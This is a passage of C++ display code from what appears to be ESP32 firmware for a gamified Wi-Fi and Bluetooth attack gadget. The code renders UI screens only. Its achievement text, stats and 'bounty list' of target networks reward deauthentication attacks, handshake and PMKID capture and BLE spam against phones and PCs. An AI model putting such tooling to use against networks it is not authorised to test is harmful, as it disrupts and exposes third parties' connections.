            uint16_t totalXP = 0;
            for (uint8_t i = 0; i < n; i++) {
              ActiveChallenge ch = {};
              if (!Challenges::getSnapshot(i, ch)) continue;
              const char* box = ch.completed ? "[*]" : ch.failed ? "[X]" : "[ ]";
              char diff = (i==0)?'E':(i==1)?'M':'H';
              char line[40];
              snprintf(line, sizeof(line), "%s %c %-18s", box, diff, ch.name);
              dst.setTextDatum(TL_DATUM);
              uint16_t col = ch.completed ? 0x07E0 : ch.failed ? 0xF800 : colorFG();
              dst.setTextColor(col, colorBG());
              dst.drawString(line, 4, y+2);
              char prog[16];
              if (ch.completed)     snprintf(prog, sizeof(prog), "DONE +%d", ch.xpReward);
              else if (ch.failed)   snprintf(prog, sizeof(prog), "FAIL +%d", ch.xpReward);
              else                  snprintf(prog, sizeof(prog), "%d/%d +%d", ch.progress, ch.target, ch.xpReward);
              dst.setTextDatum(TR_DATUM);
              dst.setTextColor(colorFG()&0x7BEF, colorBG());
              dst.drawString(prog, DISPLAY_W-4, y+2);
              totalXP += ch.xpReward;
              y += 42;
            }
            dst.setTextColor(colorFG(), colorBG());
            dst.setTextDatum(TC_DATUM);
            char tot[24]; snprintf(tot, sizeof(tot), "TOTAL: +%d XP", totalXP);
            dst.drawString(tot, DISPLAY_W/2, y+6);
          }
          dst.setTextColor(colorFG(), colorBG());
          dst.setTextDatum(TC_DATUM);
          dst.drawString("TAP-L: back   TAP-R: loot", DISPLAY_W/2, yOff+MAIN_H-20);
        }
      };
      if (useSprite) drawCap(mainSprite, 0);
      else           drawCap(tft,        TOP_BAR_H);
      break;
    }

    // ── ACHIEVEMENTS ─────────────────────────────────────────────────────────
    case PorkchopMode::ACHIEVEMENTS: {
      // howTo descriptions — parallel to ACH_LIST order
      static const char* const ACH_HOWTO[] = {
        "Capture your first handshake",
        "Find 100 networks in one session",
        "Walk 10km in a single session",
        "Hunt after midnight",
        "Find 10 hidden networks",
        "Send 100 Apple BLE packets",
        "Log 1000 networks lifetime",
        "Land 100 successful deauths",
        "Capture a PMKID",
        "Find a WPA3 network",
        "Log 100 GPS-tagged networks",
        "Walk 50km total lifetime",
        "Log 5000 networks lifetime",
        "Handshake at <10% battery",
        "50 networks in 10 minutes",
        "Send 1000 BLE packets",
        "Stare into the ether long enough",
        "Log 10,000 networks lifetime",
        "Find your first 10 networks",
        "Find 500 networks in one session",
        "Find 50 open networks",
        "Find a WEP network (ancient relic)",
        "Capture 10 handshakes lifetime",
        "Capture 50 handshakes lifetime",
        "Capture 10 PMKIDs",
        "Capture 3 handshakes in one session",
        "Capture 5 handshakes in one session",
        "Your first successful deauth",
        "Land 1000 successful deauths",
        "10 deauths in one session",
        "Walk 21km in a single session",
        "Walk 100km total lifetime",
        "Log 500 GPS-tagged networks",
        "Walk 42.195km in one session",
        "Send 100 Android FastPair spam",
        "Send 100 Samsung BLE spam",
        "Send 100 Windows SwiftPair spam",
        "Send 5000 BLE packets",
        "Send 10000 BLE packets",
        "Complete 100 sessions",
        "4 hour continuous session",
        "Hunt between 5-7am",
        "Hunt on a weekend",
        "ML detects a rogue AP",
        "Find 50 hidden networks",
        "Find 25 WPA3 networks",
        "Reach level 50",
        "Read the fine print",
        "5 minutes in passive mode",
        "30 min passive + 50 networks",
        "500 passive networks",
        "First passive PMKID capture",
        "5 passive PMKIDs",
        "Add first network to BOAR BROS",
        "5 networks in BOAR BROS",
        "First mid-attack exclusion",
        "25 networks protected",
        "50 networks in BOAR BROS",
        "Witnessed the riddle prophecy",
        "50+ networks all added as bros",
        "Deauth 5 clients in 30 seconds",
        "Deauth <2s after entering monitor",
        "Deauth during noon hour",
        "Unlock all other achievements",
      };
      static const uint8_t ACH_HOWTO_COUNT = sizeof(ACH_HOWTO)/sizeof(ACH_HOWTO[0]);

      // Detail popup (toast style — FG bg, BG text)
      auto drawAchDetail = [&](auto& dst, int yOff) {
        uint8_t i = achDetailIdx;
        bool got = (XP::getAchievements() & (uint64_t)ACH_LIST[i].flag) != 0;
        const char* howTo = (i < ACH_HOWTO_COUNT) ? ACH_HOWTO[i] : "???";
        int bW=220, bH=80, bX=(DISPLAY_W-bW)/2, bY=yOff+(MAIN_H-bH)/2;
        dst.fillRoundRect(bX-2,bY-2,bW+4,bH+4,8,colorBG());
        dst.fillRoundRect(bX,bY,bW,bH,8,colorFG());
        dst.setTextColor(colorBG(),colorFG());
        dst.setTextDatum(TC_DATUM);
        dst.drawString(got ? ACH_LIST[i].name : "UNKNOWN", DISPLAY_W/2, bY+8);
        dst.drawString(got ? "UNLOCKED" : "LOCKED",        DISPLAY_W/2, bY+22);
        // Word-wrap howTo
        char hbuf[96]; strncpy(hbuf, got?howTo:"???", 95); hbuf[95]='\0';
        for (int k=0; hbuf[k]; k++) hbuf[k]=toupper((uint8_t)hbuf[k]);
        int lineMax=28, lh=12, textY=bY+40, cx=DISPLAY_W/2, ln=0;
        const char* cur=hbuf;
        while (*cur && ln<3) {
          int rem=strlen(cur), take=rem<=lineMax?rem:lineMax, sp=take;
          if (rem>lineMax) {
            for (int j=take;j>0;j--) { if(cur[j-1]==' '){sp=j-1;break;} }
            if (!sp) sp=take;
          }
          char lb[32]; memcpy(lb,cur,sp<31?sp:31); lb[sp<31?sp:31]='\0';
          dst.drawString(lb, cx, textY+ln*lh); ln++;
          cur+=sp; while(*cur==' ')cur++;
        }
        dst.setTextDatum(TL_DATUM);
      };

      auto drawAch = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1);

        if (achDetailShow) { drawAchDetail(dst, yOff); return; }

        // Header
        dst.setTextDatum(TC_DATUM);
        char hdr[40]; snprintf(hdr,sizeof(hdr),"PR00F %d/%d  L%d",
          XP::getAchievementCount(), ACH_COUNT, XP::getLevel());
        dst.drawString(hdr, DISPLAY_W/2, yOff+2);
        dst.drawLine(4, yOff+14, DISPLAY_W-4, yOff+14, colorFG());

        // Scrollable list — 11 rows × 16px
        static const uint8_t ROWS = 11;
        uint64_t bits = XP::getAchievements();
        int lh=16, listY=yOff+16;
        for (uint8_t r=0; r<ROWS; r++) {
          uint8_t i = achScroll + r;
          if (i >= ACH_COUNT) break;
          bool got = (bits & (uint64_t)ACH_LIST[i].flag) != 0;
          int ry = listY + r*lh;
          bool sel = (i == achDetailIdx);
          if (sel) {
            dst.fillRect(0, ry, DISPLAY_W, lh-1, colorFG());
            dst.setTextColor(colorBG(), colorFG());
          } else {
            dst.setTextColor(got ? 0x07E0 : colorFG()&0x7BEF, colorBG());
          }
          dst.setTextDatum(TL_DATUM);
          char row[36]; snprintf(row,sizeof(row),"%s %s", got?"[X]":"[ ]", ACH_LIST[i].name);
          dst.drawString(row, 4, ry+3);
        }
        dst.setTextColor(colorFG(), colorBG());
        if (achScroll > 0)              { dst.setTextDatum(TR_DATUM); dst.drawString("^", DISPLAY_W-2, listY+2); }
        if (achScroll+ROWS < ACH_COUNT) { dst.setTextDatum(TR_DATUM); dst.drawString("v", DISPLAY_W-2, listY+(ROWS-1)*lh+2); }
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP-L:up  TAP-R:dn  TAP:detail  HOLD:back", DISPLAY_W/2, yOff+MAIN_H-10);
      };
      if (useSprite) drawAch(mainSprite, 0);
      else           drawAch(tft,        TOP_BAR_H);
      break;
    }

    // ── SWINE STATS ───────────────────────────────────────────────────────────
    case PorkchopMode::SWINE_STATS: {
      auto drawTabBar = [&](auto& dst, int yOff) {
        static const char* TABS[] = {"ST4TS","B00STS","W1GL3"};
        const int nTabs=3, tabH=13, margin=2, spacing=2;
        int availW = DISPLAY_W - margin*2 - spacing*(nTabs-1);
        int baseW = availW/nTabs, rem = availW%nTabs;
        dst.setTextDatum(MC_DATUM); dst.setTextSize(1);
        int x = margin;
        for (int i=0; i<nTabs; i++) {
          int w = baseW + (i<rem?1:0);
          bool active = (i == (int)swineTab);
          if (active) {
            dst.fillRect(x, yOff, w, tabH, colorFG());
            dst.setTextColor(colorBG(), colorFG());
          } else {
            dst.drawRect(x, yOff, w, tabH, colorFG());
            dst.setTextColor(colorFG(), colorBG());
          }
          dst.drawString(TABS[i], x+w/2, yOff+6);
          x += w + spacing;
        }
        dst.setTextColor(colorFG(), colorBG());
      };

      auto drawStatsTab = [&](auto& dst, int yOff) {
        dst.setTextSize(1); dst.setTextDatum(TL_DATUM);
        uint8_t lv = XP::getLevel(); uint8_t prog = XP::getProgress();
        char b[64];
        snprintf(b,sizeof(b),"LVL %d: %s", lv, XP::getTitle());
        dst.drawString(b, 5, yOff+14);
        dst.setTextDatum(TR_DATUM);
        snprintf(b,sizeof(b),"T13R: %s", XP::getTitle());
        dst.drawString(b, DISPLAY_W-5, yOff+14);
        // XP bar
        int bX=5, bY=yOff+24, bW=DISPLAY_W-10, bH=6;
        dst.drawRect(bX,bY,bW,bH,colorFG());
        dst.fillRect(bX+1,bY+1,(bW-2)*prog/100,bH-2,colorFG());
        dst.setTextDatum(TC_DATUM);
        snprintf(b,sizeof(b),"%lu XP (%d%%)", XP::getTotalXP(), prog);
        dst.drawString(b, DISPLAY_W/2, yOff+32);
        // Stats grid — 4 rows, 2 cols
        dst.setTextDatum(TL_DATUM);
        int c1=5, c2=75, c3=125, c4=195, y=yOff+44, lh=10;
        dst.drawString("N3TW0RKS:", c1,y);
        snprintf(b,sizeof(b),"%lu",XP::getLNets());    dst.drawString(b,c2,y);
        dst.drawString("H4NDSH4K3S:",c3,y);
        snprintf(b,sizeof(b),"%lu",XP::getLHS());      dst.drawString(b,c4,y); y+=lh;
        dst.drawString("PMK1DS:",  c1,y);
        snprintf(b,sizeof(b),"%lu",XP::getLPMKID());   dst.drawString(b,c2,y);
        dst.drawString("D34UTHS:", c3,y);
        snprintf(b,sizeof(b),"%lu",XP::getLDeauth());  dst.drawString(b,c4,y); y+=lh;
        dst.drawString("S3SS10NS:",c1,y);
        snprintf(b,sizeof(b),"%u",XP::getSessions());  dst.drawString(b,c2,y);
        dst.drawString("BL3:",     c3,y);
        snprintf(b,sizeof(b),"%lu",PiggyBlues::getPackets()); dst.drawString(b,c4,y); y+=lh;
        uint32_t upS=millis()/1000;
        snprintf(b,sizeof(b),"UP:%u:%02u:%02u",upS/3600,(upS%3600)/60,upS%60);
        dst.drawString(b,c1,y);
        snprintf(b,sizeof(b),"GPS:%s",gpsHasFix?"FIX":"--"); dst.drawString(b,c3,y);
      };

      auto drawBuffsTab = [&](auto& dst, int yOff) {
        dst.setTextSize(1); dst.setTextDatum(TL_DATUM);
        int y=yOff+14;
        // Class tier perks
        char th[32]; snprintf(th,sizeof(th),"%s T13R P3RKS:", XP::getTitle());
        dst.drawString(th, 5, y); y+=10;
        uint8_t lv = XP::getLevel();
        if (lv>=6)  { dst.drawString("[*] A1R R34D3R    -8% Sweep",   5,y); y+=10; }
        if (lv>=11) { dst.drawString("[*] T4RG3T F0CU5  +0.6s Lock",  5,y); y+=10; }
        if (lv>=16) { dst.drawString("[*] R04M CR3D     +12% dist XP",5,y); y+=10; }
        if (lv>=21) { dst.drawString("[*] GL4SS ST4R3+  +0.8s Lock",  5,y); y+=10; }
        if (lv>=26) { dst.drawString("[*] L00T M3M0RY   +10% cap XP", 5,y); y+=10; }
        if (lv<6)   { dst.drawString("[=] N0N3 (LVL 6+)",             5,y); y+=10; }
        // Mood buffs
        y+=4; dst.drawString("M00D B00STS:", 5, y); y+=10;
        int hap = Mood::getEffectiveHappiness();
        int cnt=0;
        if (hap>80) { dst.drawString("[+] NE0N H1GH   Sweep -18%",  5,y); y+=10; cnt++; }
        if (hap>50) { dst.drawString("[+] SN0UT$HARP  +18% XP",     5,y); y+=10; cnt++; }
        if (hap<-30){ dst.drawString("[-] SLOPSLUG    Sweep +12%",   5,y); y+=10; cnt++; }
        if (!cnt)    { dst.drawString("[=] N0N3 ACT1V3",              5,y); }
      };

      auto drawStats = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.fillRect(0, yOff, DISPLAY_W, MAIN_H, colorBG());
        drawTabBar(dst, yOff);
        if      (swineTab==0) drawStatsTab(dst, yOff);
        else if (swineTab==1) drawBuffsTab(dst, yOff);
        else {
          // W1GL3 tab — stub (CYD has no WiGLE upload)
          dst.setTextSize(1); dst.setTextDatum(TC_DATUM);
          dst.drawString("W1GL3 ST4TS", DISPLAY_W/2, yOff+40);
          dst.drawString("N0 W1GL3 ON CYD", DISPLAY_W/2, yOff+60);
          dst.drawString("(no upload feature)", DISPLAY_W/2, yOff+76);
        }
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP-L:tab  TAP-R:tab  HOLD:back", DISPLAY_W/2, yOff+MAIN_H-10);
      };
      if (useSprite) drawStats(mainSprite, 0);
      else           drawStats(tft,        TOP_BAR_H);
      break;
    }


    // ── BOUNTY STATUS ─────────────────────────────────────────────────────────
    case PorkchopMode::BOUNTY_STATUS: {
      auto drawBounty = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1); dst.setTextDatum(TC_DATUM);
        dst.drawString("BOUNTY LIST", DISPLAY_W/2, yOff+4);
        dst.setTextSize(1);
        dst.drawLine(10, yOff+22, DISPLAY_W-10, yOff+22, colorFG());

        // Build scored target list from current NetworkRecon data
        struct BountyEntry { char ssid[33]; int8_t rssi; uint8_t ch; uint8_t auth; bool hasPMF; bool hasHS; uint8_t clients; uint8_t attempts; };
        BountyEntry entries[10]; uint8_t eCount=0;

        NetworkRecon::enterCritical();
        const auto& nets = NetworkRecon::getNetworks();
        for (const auto& n : nets) {
          if (!n.ssid[0] || n.isHidden) continue;
          if (n.authmode == WIFI_AUTH_OPEN) continue;
          if (eCount >= 10) break;
          BountyEntry& e = entries[eCount++];
          strncpy(e.ssid, n.ssid, 32); e.ssid[32]=0;
          e.rssi   = n.rssiAvg ? n.rssiAvg : n.rssi;
          e.ch     = n.channel;
          e.auth   = n.authmode;
          e.hasPMF = n.hasPMF;
          e.hasHS  = n.hasHandshake;
          e.attempts = n.attackAttempts;
          // Count known clients (reuse getClients below)
          uint8_t cbuf[CLIENT_MAX_PER_AP*6];
          e.clients = NetworkRecon::getClients(n.bssid, cbuf, CLIENT_MAX_PER_AP);
        }
        NetworkRecon::exitCritical();

        if (eCount == 0) {
          dst.drawString("NO TARGETS YET", DISPLAY_W/2, yOff+60);
          dst.drawString("Start OINK or DNH mode", DISPLAY_W/2, yOff+78);
        } else {
          // Header row
          dst.setTextDatum(TL_DATUM);
          dst.setTextColor(colorFG(), colorBG());
          dst.drawString("SSID          RSSI CH FL", 4, yOff+26);
          dst.drawLine(4, yOff+36, DISPLAY_W-4, yOff+36, colorFG());

          for (uint8_t i=0; i<eCount && i<8; i++) {
            BountyEntry& e = entries[i];
            char line[40];
            char flags[5]="----";
            if (e.hasPMF)   flags[0]='P';
            if (e.hasHS)    flags[1]='H';
            if (e.auth==WIFI_AUTH_WPA3_PSK || e.auth==WIFI_AUTH_WPA2_WPA3_PSK) flags[2]='3';
            if (e.attempts) flags[3]='0'+e.attempts;
            char sid[13]; strncpy(sid,e.ssid,12); sid[12]=0;
            snprintf(line, sizeof(line), "%-12s %4d %2d %s",
                     sid, e.rssi, e.ch, flags);
            uint16_t col = colorFG();
            if (e.hasHS)  col = 0x07E0;
            else if (e.hasPMF || (e.auth==WIFI_AUTH_WPA3_PSK)) col = 0xF800;
            else if (e.attempts > 0) col = 0xFFE0;
            dst.setTextColor(col, colorBG());
            dst.drawString(line, 4, yOff+40+i*10);
          }
          dst.setTextColor(colorFG(), colorBG());
          dst.setTextDatum(TC_DATUM);
          char cnt[32]; snprintf(cnt,sizeof(cnt),"%d targets", eCount);
          dst.drawString(cnt, DISPLAY_W/2, yOff+MAIN_H-20);
        }
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP: refresh  HOLD: back", DISPLAY_W/2, yOff+MAIN_H-20);
      };
      if (useSprite) drawBounty(mainSprite, 0);
      else           drawBounty(tft,        TOP_BAR_H);
      break;
    }

    // ── DIAGNOSTICS ──────────────────────────────────────────────────────────
    case PorkchopMode::DIAGNOSTICS: {
      auto drawDiag = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1); dst.setTextDatum(TC_DATUM);
        dst.drawString("DIAGNOSTICS", DISPLAY_W/2, yOff+4);
        dst.setTextSize(1);
        dst.drawLine(10, yOff+22, DISPLAY_W-10, yOff+22, colorFG());
        dst.setTextDatum(TL_DATUM);
        char b[48];
        int lx=6, rx=166, y=yOff+26, dy=12;
        // Left col
        uint8_t hPct = HeapHealth::getDisplayPercent();
        const char* pressure[] = {"OK","CAU","WARN","CRIT"};
        uint8_t pl = (uint8_t)HeapHealth::getPressureLevel() > 3 ? 3 : (uint8_t)HeapHealth::getPressureLevel();
        snprintf(b,sizeof(b),"HEAP:%uB",   ESP.getFreeHeap());             dst.drawString(b,lx,y);
        snprintf(b,sizeof(b),"BLK:%uB",    heap_caps_get_largest_free_block(MALLOC_CAP_8BIT)); dst.drawString(b,rx,y); y+=dy;
        snprintf(b,sizeof(b),"MIN:%uB",    HeapHealth::getMinFree());      dst.drawString(b,lx,y);
        snprintf(b,sizeof(b),"HLTH:%d%% %s", hPct, pressure[pl]);          dst.drawString(b,rx,y); y+=dy;
        dst.drawLine(10,y,DISPLAY_W-10,y,colorFG()); y+=4;
        snprintf(b,sizeof(b),"PKTS:%lu",   NetworkRecon::getPacketCount()); dst.drawString(b,lx,y);
        snprintf(b,sizeof(b),"CH:%d%s",    NetworkRecon::getChannel(), NetworkRecon::isChannelLocked()?"L":""); dst.drawString(b,rx,y); y+=dy;
        snprintf(b,sizeof(b),"NETS:%u",    NetworkRecon::getNetworkCount()); dst.drawString(b,lx,y);
        snprintf(b,sizeof(b),"%s",         NetworkRecon::isRunning()?"PROMISC":"STA"); dst.drawString(b,rx,y); y+=dy;
        dst.drawLine(10,y,DISPLAY_W-10,y,colorFG()); y+=4;
        uint32_t up=millis()/1000;
        snprintf(b,sizeof(b),"UP:%u:%02u:%02u", up/3600,(up%3600)/60,up%60); dst.drawString(b,lx,y);
        snprintf(b,sizeof(b),"%uMHz",      ESP.getCpuFreqMHz()); dst.drawString(b,rx,y); y+=dy;
        snprintf(b,sizeof(b),"MOOD:%d GPS:%s", Mood::getCurrentHappiness(), gpsHasFix?"FIX":"--"); dst.drawString(b,lx,y); y+=dy;
        if (sdAvailable) {
          snprintf(b,sizeof(b),"SD:%lluMB free", (SD.totalBytes()-SD.usedBytes())/(1024*1024));
        } else {
          strcpy(b,"SD: no card");
        }
        dst.drawString(b,lx,y);
        float kr = HeapHealth::getKnuthRatio();
        if (kr > 0.0f) {
          snprintf(b,sizeof(b),"KNUTH:%.2f%s", kr, kr>0.7f?"!":"");
          dst.drawString(b,rx,y);
        }
        dst.setTextDatum(TC_DATUM);
        if (WebUI::isActive()) {
          dst.drawString("192.168.4.1  HOLD:back", DISPLAY_W/2, yOff+MAIN_H-20);
        } else {
          dst.drawString("TAP:WEBUI  HOLD:back", DISPLAY_W/2, yOff+MAIN_H-20);
        }
      };
      if (useSprite) drawDiag(mainSprite, 0);
      else           drawDiag(tft,        TOP_BAR_H);
      break;
    }

    // ── UNLOCKABLES ──────────────────────────────────────────────────────────
    case PorkchopMode::UNLOCKABLES: {
      // SHA256-verified secret phrases — mbedtls is available on ESP32
      struct UnlockDef { const char* name; const char* hint; const char* hash; uint8_t bit; };
      static const UnlockDef UNLOCKS[] = {
        {"PROPHECY",  "THE PROPHECY SPEAKS THE KEY",   "13ca9c448763034b2d1b1ec33b449ae90433634c16b50a0a9fba6f4b5a67a72a", 0},
        {"1MM0RT4L",  "PIG SURVIVES M5BURNER",         "6c58bc00fea09c8d7fdb97c7b58741ad37bd7ba8e5c76d35076e3b57071b172b", 1},
        {"C4LLS1GN",  "UNIX KNOWS. DO YOU?",           "73d7b7288d31175792d8a1f51b63936d5683718082f5a401b4e9d6829de967d3", 2},
        {"B4K3D_P1G", "JAH PROVIDES. PIG RESTS.",      "af062b87461d9caa433210fc29a6c1c2aaf28c09c6c54578f16160d7d6a8caa0", 3},
      };
      static uint8_t unlkSel = 0;
      static bool    unlkEntering = false;
      static char    unlkBuf[33] = "";
      static uint8_t unlkLen = 0;

      auto drawUnlk = [&](auto& dst, int yOff) {
        uint32_t bits = XP::getUnlockables();
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1); dst.setTextDatum(TC_DATUM);
        dst.drawString("UNLOCKABLES", DISPLAY_W/2, yOff+4);
        dst.setTextSize(1);
        dst.drawLine(10, yOff+22, DISPLAY_W-10, yOff+22, colorFG());

        if (unlkEntering) {
          // Text input overlay
          dst.setTextDatum(TC_DATUM);
          dst.fillRect(30, yOff+60, DISPLAY_W-60, 50, colorBG());
          dst.drawRect(30, yOff+60, DISPLAY_W-60, 50, colorFG());
          dst.drawString("ENTER THE KEY", DISPLAY_W/2, yOff+68);
          char disp[24]; uint8_t dlen=unlkLen;
          if(dlen>18){snprintf(disp,sizeof(disp),"...%s",unlkBuf+dlen-15);}
          else{strncpy(disp,unlkBuf,sizeof(disp)-2);disp[dlen]=0;}
          strncat(disp,"_",sizeof(disp)-strlen(disp)-1);
          dst.drawString(disp, DISPLAY_W/2, yOff+84);
          dst.drawString("HOLD: cancel", DISPLAY_W/2, yOff+100);
          return;
        }

        for (uint8_t i=0; i<4; i++) {
          bool got = bits & (1UL<<UNLOCKS[i].bit);
          int iy = yOff+28+i*34;
          if (i==unlkSel) dst.fillRect(8, iy-2, DISPLAY_W-16, 30, colorFG()&0x18E3);
          dst.setTextDatum(TL_DATUM);
          dst.setTextColor(got ? 0x07E0 : colorFG(), colorBG());
          char line[24]; snprintf(line,sizeof(line),"%s %s", got?"[X]":"[ ]", UNLOCKS[i].name);
          dst.drawString(line, 14, iy+2);
          dst.setTextColor(colorFG()&0x7BEF, colorBG());
          dst.setTextSize(1); dst.drawString(UNLOCKS[i].hint, 14, iy+14);
          dst.setTextColor(colorFG(), colorBG());
        }
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP: try phrase  HOLD: back", DISPLAY_W/2, yOff+MAIN_H-20);
      };
      if (useSprite) drawUnlk(mainSprite, 0);
      else           drawUnlk(tft,        TOP_BAR_H);
      break;
    }

    // ── BOAR BROS (exclusion list + PigSync) ─────────────────────────────────
    case PorkchopMode::BOAR_BROS: {
      auto drawBoar = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1); dst.setTextDatum(TC_DATUM);
        uint8_t broCount = OinkMode::getBoarBroCount();
        char hdr[40]; snprintf(hdr,sizeof(hdr),"BOAR BROS [%d excluded]", broCount);
        dst.drawString(hdr, DISPLAY_W/2, yOff+2);
        dst.drawLine(4, yOff+14, DISPLAY_W-4, yOff+14, colorFG());

        // Exclusion list (BSSID-only since we store as uint64)
        if (broCount == 0) {
          dst.setTextDatum(TL_DATUM);
          dst.drawString("No bros yet.", 4, yOff+18);
          dst.drawString("In OINK mode: tap target SSID", 4, yOff+30);
          dst.drawString("area to exclude a network.", 4, yOff+42);
        } else {
          dst.setTextDatum(TL_DATUM);
          // Show up to 6 BSSIDs from the internal array
          // Access via repeated calls — we expose the list via getBoarBroCount only
          // For display, iterate OinkMode's internal array via a helper
          // Since we can't directly access _boarBros, show count + hint
          char b[40]; snprintf(b,sizeof(b),"%d networks protected:", broCount);
          dst.drawString(b, 4, yOff+18);
          dst.setTextColor(colorFG()&0x7BEF, colorBG());
          dst.drawString("(BSSIDs stored in RAM)", 4, yOff+30);
          dst.drawString("Resets on power cycle.", 4, yOff+42);
          dst.setTextColor(colorFG(), colorBG());
        }
        dst.drawLine(4, yOff+56, DISPLAY_W-4, yOff+56, colorFG());

        // PigSync section
        dst.setTextDatum(TC_DATUM);
        char sync[40]; snprintf(sync,sizeof(sync),"PIGSYNC [%s]", PigSync::getStateName());
        dst.drawString(sync, DISPLAY_W/2, yOff+60);

        if (!PigSync::isRunning()) {
          dst.drawString("TAP: start ESP-NOW scan", DISPLAY_W/2, yOff+76);
        } else {
          uint8_t n = PigSync::getDeviceCount();
          if (n == 0) {
            dst.drawString("SCANNING FOR SIRLOINS...", DISPLAY_W/2, yOff+76);
          } else {
            dst.setTextDatum(TL_DATUM);
            uint8_t sel = PigSync::getSelectedIdx();
            for (uint8_t i=0; i<n && i<3; i++) {
              const SirloinDevice* d = PigSync::getDevice(i);
              if (!d) continue;
              char line[48];
              snprintf(line,sizeof(line),"%s%02X:%02X:%02X:%02X:%02X:%02X C:%d",
                i==sel?">":"",
                d->mac[0],d->mac[1],d->mac[2],d->mac[3],d->mac[4],d->mac[5],
                d->pendingCaptures);
              dst.setTextColor((i==sel) ? colorFG() : (colorFG()&0x7BEF), colorBG());
              dst.drawString(line, 4, yOff+74+i*12);
            }
            dst.setTextColor(colorFG(), colorBG());
          }
          if (PigSync::isSyncing()) {
            char p[40]; snprintf(p,sizeof(p),"SYNCING %dP+%dHS",
              PigSync::getSyncedPMKIDs(), PigSync::getSyncedHS());
            dst.setTextDatum(TC_DATUM); dst.drawString(p, DISPLAY_W/2, yOff+112);
          } else if (PigSync::isSyncComplete()) {
            char res[48]; snprintf(res,sizeof(res),"DONE %d+%d BNTY:%d",
              PigSync::getSyncedPMKIDs(), PigSync::getSyncedHS(), PigSync::getLastBounty());
            dst.setTextDatum(TC_DATUM); dst.drawString(res, DISPLAY_W/2, yOff+112);
          } else if (*PigSync::getLastError()) {
            dst.setTextColor(0xF800, colorBG());
            dst.setTextDatum(TC_DATUM); dst.drawString(PigSync::getLastError(), DISPLAY_W/2, yOff+112);
            dst.setTextColor(colorFG(), colorBG());
          }
        }
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP:sync  HOLD:back", DISPLAY_W/2, yOff+MAIN_H-10);
      };
      if (useSprite) drawBoar(mainSprite, 0);
      else           drawBoar(tft,        TOP_BAR_H);
      break;
    }

    // ── BACON MODE ────────────────────────────────────────────────────────────
    case PorkchopMode::BACON_MODE: {
      auto drawBacon = [&](auto& dst, int yOff) {
        dst.setTextColor(colorFG(), colorBG());
        dst.setTextSize(1); dst.setTextDatum(TC_DATUM);
        // ON AIR badge header
        char hdr[32]; snprintf(hdr,sizeof(hdr),"[ ON AIR ] CH:%d",BaconMode::BACON_CHANNEL);
        dst.drawString(hdr, DISPLAY_W/2, yOff+6);
        dst.setTextSize(1);
        // Tier indicator
        char t[48]; snprintf(t,sizeof(t),"TIER %d  %dMS  %.1f B/S",
               BaconMode::getTier(), BaconMode::getInterval(), BaconMode::getBeaconRate());
        dst.drawString(t, DISPLAY_W/2, yOff+30);
        // Beacon count
        char bc[32]; snprintf(bc,sizeof(bc),"BEACONS TX: %lu", BaconMode::getBeaconCount());
        dst.drawString(bc, DISPLAY_W/2, yOff+44);
        dst.drawLine(20, yOff+56, DISPLAY_W-20, yOff+56, colorFG());
        // AP fingerprint list
        dst.setTextDatum(TL_DATUM);
        dst.drawString("FINGERPRINTED APs:", 10, yOff+62);
        uint8_t n = BaconMode::getAPCount();
        const BaconAP* aps = BaconMode::getAPs();
        if (n == 0) {
          dst.drawString("scanning...", 10, yOff+76);
        } else {
          for (int i=0; i<n && i<3; i++) {
            char ap[52];
            snprintf(ap, sizeof(ap), "%-9s %4d CH%d %s",
                     OUI::getVendor(aps[i].bssid),
                     aps[i].rssi, aps[i].channel, aps[i].ssid[0]?aps[i].ssid:"???");
            dst.drawString(ap, 10, yOff+76+i*18);
          }
        }
        // Tier buttons hint
        dst.setTextDatum(TC_DATUM);
        dst.drawString("TAP-L=T1  TAP-C=T2  TAP-R=T3", DISPLAY_W/2, yOff+130);
        dst.drawString(Mood::getCurrentPhrase(), DISPLAY_W/2, yOff+MAIN_H-20);
        // Avatar
        Avatar::draw();
      };
      if (useSprite) drawBacon(mainSprite, 0);
      else           drawBacon(tft,        TOP_BAR_H);
      break;
    }
      if (useSprite) {
        mainSprite.setTextDatum(TC_DATUM);
        mainSprite.setTextColor(colorFG(), colorBG());
        mainSprite.setTextSize(1);
        mainSprite.drawString("PORKCHOP CYD", DISPLAY_W/2, MAIN_H/2-10);
        mainSprite.setTextSize(1);
        mainSprite.drawString(Mood::getCurrentPhrase(), DISPLAY_W/2, MAIN_H/2+14);
      } else {
        tft.setTextDatum(TC_DATUM);
        tft.setTextColor(colorFG(), colorBG());
        tft.setTextSize(1);
        tft.drawString("PORKCHOP CYD", DISPLAY_W/2, TOP_BAR_H+MAIN_H/2-10);
        tft.setTextSize(1);
        tft.drawString(Mood::getCurrentPhrase(), DISPLAY_W/2, TOP_BAR_H+MAIN_H/2+14);
      }
      break;
  }

  // ── Toast overlay ───────────────────────────────────────────────────────────
  if (toastActive) {
    if (millis() - toastStart >= toastDuration) {
      toastActive = false;
    } else {
      int bx=(DISPLAY_W-260)/2, by = useSprite ? (MAIN_H-40)/2 : TOP_BAR_H+(MAIN_H-40)/2;
      if (useSprite) {
        mainSprite.fillRoundRect(bx,by,260,40,8,colorFG());
        mainSprite.setTextColor(colorBG(),colorFG());
        mainSprite.setTextSize(1);
        mainSprite.setTextDatum(TC_DATUM);
        mainSprite.drawString(toastMsg, DISPLAY_W/2, by+15);
      } else {
        tft.fillRoundRect(bx,by,260,40,8,colorFG());
        tft.setTextColor(colorBG(),colorFG());
        tft.setTextSize(1);
        tft.setTextDatum(TC_DATUM);
        tft.drawString(toastMsg, DISPLAY_W/2, by+15);
      }
    }
  }

  // ── Push sprite (if used) ───────────────────────────────────────────────────
  if (useSprite) {
    mainSprite.pushSprite(0, TOP_BAR_H);
    // Fill gap if sprite shorter than MAIN_H
    int gap = MAIN_H - sprH;
